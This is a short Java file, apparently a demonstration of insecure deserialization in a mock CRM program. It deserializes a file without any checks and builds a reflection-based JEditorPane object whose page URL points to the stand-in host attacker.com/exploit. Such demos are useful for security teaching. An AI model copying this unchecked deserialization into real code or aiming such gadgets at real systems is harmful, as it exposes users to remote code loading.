import java.io.*;
import java.util.*;

class Customer implements Serializable {
    private String name;
    private transient String creditCard;
    
    public Customer(String name, String card) {
        this.name = name;
        this.creditCard = card;
    }
    
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        System.out.println("Loading customer: " + name);
    }
}

public class CRMSystem {
    public static void main(String[] args) throws Exception {
        String filename = "customer.dat";
        
        // 模拟存储恶意数据
        ObjectOutputStream out = new ObjectOutputStream(
            new FileOutputStream(filename));
        out.writeObject(lookup());
        out.close();
        
        // 漏洞触发点
        ObjectInputStream in = new ObjectInputStream(
            new FileInputStream(filename));
        Object obj = in.readObject();
        System.out.println("Recovered: " + obj.getClass());
    }
    
    static Object lookup() {
        try {
            Class<?> clazz = Class.forName("javax.swing.JEditorPane");
            Object o = clazz.newInstance();
            java.lang.reflect.Field field = clazz.getDeclaredField("page");
            field.setAccessible(true);
            field.set(o, new java.net.URL("http://attacker.com/exploit"));
            return o;
        } catch (Exception e) {
            return null;
        }
    }
}